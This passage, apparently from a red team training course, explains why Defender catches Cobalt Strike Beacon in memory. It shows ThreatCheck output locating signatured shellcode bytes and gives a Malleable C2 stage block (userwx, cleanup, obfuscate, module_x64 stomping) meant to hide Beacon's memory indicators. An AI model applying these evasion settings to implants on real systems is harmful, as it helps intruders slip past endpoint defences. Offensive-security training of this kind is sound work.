Beacon is also susceptible to being caught whilst it's running in memory.  Some actions, such as lateral movement, will trigger these memory scans; but Defender also carries out routine scans against running processes.  Therefore, the time between spawning your Beacon and the time to detection can vary greatly.  You can see the "sms" label in the Defender UI, which indicates the alert originated from a memory scan.

  

![](https://files.cdn.thinkific.com/file_uploads/584845/images/8e2/080/a94/sms.png)

  

Alternatively, `Get-MpThreatDetection` labels them as _behavior:_process_.
```

ActionSuccess                  : True
AdditionalActionsBitMask       : 0
AMProductVersion               : 4.18.23080.2006
CleaningActionID               : 3
CurrentThreatExecutionStatusID : 3
DetectionID                    : {7114476A-30B4-4D1C-A50A-14C024DFBDD3}
DetectionSourceTypeID          : 0
DomainUser                     :
InitialDetectionTime           : 12/10/2023 13:52:38
LastThreatStatusChangeTime     : 12/10/2023 13:52:40
ProcessName                    : C:\Windows\System32\rundll32.exe
RemediationTime                : 12/10/2023 13:52:40
Resources                      : {behavior:_process: C:\Windows\System32\rundll32.exe, pid:3196:59045527721095,
                                 process:_pid:3196,ProcessStart:133415922931504282}
ThreatID                       : 2147798570
ThreatStatusErrorCode          : 0
ThreatStatusID                 : 4
PSComputerName                 :
```
  

Scanning the shellcode payload type with ThreatCheck can be a good way to help find these signatures because although the service binary artifact itself is "clean":
```
PS C:\Users\Attacker\Desktop> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\http_x64.svc.exe
[+] No threat found!
[*] Run time: 0.55s
```
  

The raw shellcode is not:
```
PS C:\Users\Attacker\Desktop> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\http_x64.xprocess.bin
[+] Target file size: 295936 bytes
[+] Analyzing...
[!] Identified end of bad bytes at offset 0xF61F
00000000   3B DE 7D 34 0F BE 13 48  FF C3 40 0F BE C5 8B CA   ;_}4·_·HÿA@·_Å?E
00000010   C0 FA 04 41 83 C2 02 83  E1 0F 80 E2 0F 03 C8 40   Aú·A?A·?á·?â··E@
00000020   02 D5 43 88 4C 0B 01 49  8D 0C 18 43 88 14 0B 49   ·OC?L··I?··C?··I
00000030   83 C3 02 48 3B CF 7C C7  48 8B 5C 24 08 48 8B 6C   ?A·H;I|ÇH?\$·H?l
00000040   24 10 48 8B 74 24 18 48  8B 7C 24 20 41 8B C2 C3   $·H?t$·H?|$ A?AA
00000050   CC 4C 63 D2 49 63 C1 49  83 EA 04 4C 3B D0 76 03   ILcOIcAI?ê·L;Dv·
00000060   33 C0 C3 4C 8B D9 48 83  C1 04 83 EA 04 74 25 45   3AAL?UH?A·?ê·t%E
00000070   33 C9 44 8B D2 49 2B C8  49 8B C1 49 FF C1 83 E0   3ÉD?OI+EI?AIÿA?à
00000080   03 42 8A 04 18 42 32 04  01 41 88 00 49 FF C0 49   ·B?··B2··A?·IÿAI
00000090   FF CA 75 E4 8B C2 C3 CC  CC 48 8B C4 48 89 58 08   ÿEuä?AAIIH?ÄH?X·
000000A0   48 89 68 10 48 89 70 18  48 89 78 20 41 56 48 83   H?h·H?p·H?x AVH?
000000B0   EC 20 48 63 F2 49 63 C1  49 8B D8 48 83 C6 04 8B   ì HcòIcAI?OH?Æ·?
000000C0   FA 48 8B E9 4D 8B F0 48  3B F0 76 04 33 C0 EB 33   úH?éM?dH;dv·3Aë3
000000D0   E8 E4 ED FF FF 33 D2 89  03 48 83 C3 04 85 FF 74   èäíÿÿ3O?·H?A·?ÿt
000000E0   20 48 2B EB 48 8B C7 48  8B CA 48 FF C2 83 E1 03    H+ëH?ÇH?EHÿA?á·
000000F0   42 8A 0C 31 32 0C 2B 88  0B 48 FF C3 48 FF C8 75   B?·12·+?·HÿAHÿEu
```
  

This indicates to us that the signature(s) are targeting the reflective loader or the Beacon DLL.  The Beacon source code is closed source, so we have no way to access or modify it directly.  We could technically write a completely custom reflective loader through the UDRL kit, but that's out of scope for the RTO audience.  The easiest way to make modifications to both of these components is by using what's exposed in Malleable C2.

These are the four simple settings that I recommend trying:
```
stage {
        set userwx "false";
        set cleanup "true";
        set obfuscate "true";
        set module_x64 "xpsservices.dll";
}
```
  

Setting `userwx` to _false_ tells the reflective loader to allocate memory for the Beacon DLL as RW/RX rather than RWX.  Although this does not remove any indications from the Beacon itself, having RX memory is certainly less suspicious than RWX.

  

![](https://files.cdn.thinkific.com/file_uploads/584845/images/a9d/6b0/4d0/reflective-loader-memory.png)

  

Setting `cleanup` to _true_ tells Beacon to free the memory associated with the reflective loader after it has been loaded.  Once the Beacon is loaded, the reflective loader is no longer required and leaving it in memory just results in indicators sitting there waiting to be spotted.  This allows the reflective loader to be freed, thus removing those indicators for the remainder of Beacon's lifetime.

  

![](https://files.cdn.thinkific.com/file_uploads/584845/images/0ee/294/65d/cleanup.png)

  

Setting `obfuscate` to _true_ does a number of things but the most interesting is that it instructs the reflective loader to load Beacon into memory without its DLL headers.  The omission of these headers reduces the number of indicators in memory, which will circumvent signatures target them specifically.

In all cases above, we can see that the "Use" column for Beacon's memory region is blank.  This is because the DLL is reflectively loaded from memory, rather than being loaded from disk.  Every other legitimate RX region in the process is backed by a DLL on disk, so this makes the Beacon stand out.  Setting the _module_x64_ (and _module_x86_ for 32-bit payloads) tells the reflective loader to load the specified DLL from disk first and then overwrite the memory allocated for it with Beacon.  This has the effect of making it appear as though Beacon's memory region is backed by a legitimate DLL.  There are two caveats to consider when choosing a DLL to use.

1. The DLL size must be equal to or greater than Beacon.
2. The DLL must not be needed by the application hosting Beacon.  This isn't a concern when executing the artifacts, but does become relevant when injecting Beacon shellcode into existing processes.

  

![](https://files.cdn.thinkific.com/file_uploads/584845/images/224/f39/3b6/module-overload.png)